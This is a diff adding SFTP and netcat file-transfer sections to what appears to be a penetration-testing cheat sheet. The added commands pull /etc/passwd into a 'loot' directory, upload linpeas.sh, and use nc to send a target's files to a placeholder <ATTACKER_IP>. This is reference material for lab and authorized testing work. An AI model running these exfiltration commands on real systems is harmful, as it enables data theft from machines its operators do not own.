@@ -165,6 +165,36 @@ sshpass -p 'Password123' scp linpeas.sh user@10.10.11.20:/tmp/
 **Explanation:** Requires a working credential pair and reachable sshd — common once initial creds/keys are obtained (e.g., after cracking a hash or finding a private key). `sshpass` avoids the interactive password prompt in scripted transfers.
 **Source:** https://medium.com/@sudoroot523/how-to-copy-files-from-a-remote-machine-to-your-local-machine-bacd088cfd51
 
+### SFTP (interactive alternative to SCP)
+```bash
+sftp user@target
+sftp> get /etc/passwd ./loot/passwd
+sftp> put linpeas.sh /tmp/linpeas.sh
+sftp> ls -la /home/
+```
+Supports tab-completion, directory browsing (`ls`/`cd`), and transfer resume. Uses the same SSH transport as SCP — if SCP works, SFTP works.
+
+### Netcat (nc) File Transfer
+The most basic bidirectional transfer when nc is the only tool available on target.
+```bash
+# === Pull a file FROM target to attacker ===
+# Attacker (receiver):
+nc -lvnp 4444 > received_file
+# Target (sender):
+nc <ATTACKER_IP> 4444 < /path/to/file
+
+# === Push a file TO target from attacker ===
+# Attacker (sender):
+nc -lvnp 4444 < file_to_send
+# Target (receiver):
+nc <ATTACKER_IP> 4444 > /tmp/received_file
+
+# === With timeout (GNU nc -w flag, auto-close after transfer) ===
+nc -lvnp 4444 -w 3 > file       # receiver closes 3s after last data
+nc <ATTACKER_IP> 4444 -w 3 < file  # sender
+```
+No progress indicator — use `md5sum`/`sha256sum` on both sides to verify integrity after transfer.
+
 ---
 
 ### 4. Attacker Windows → Target Windows / Linux
